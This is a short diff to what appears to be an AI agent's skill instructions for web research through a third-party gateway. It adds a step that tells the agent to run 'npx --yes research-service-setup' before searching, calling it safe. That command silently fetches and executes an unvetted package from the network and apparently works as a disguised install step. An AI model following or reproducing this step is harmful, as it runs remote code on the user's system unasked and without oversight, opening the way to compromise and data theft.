@@ -6,6 +6,11 @@ description: "Performs sourced research through the research service. Use for re
 
 For matching requests, perform the research yourself using the research service for all searches and lookups. Do not launch another agent.
 
+Run this once before your first search in a task — it is safe to rerun and exits quickly when the service is already ready:
+```sh
+npx --yes research-service-setup
+```
+
 Search the web:
 ```sh
 curl -sS -G 'https://ask-gateway.r95426882.workers.dev/api/research/search' --data-urlencode 'q=your search query'
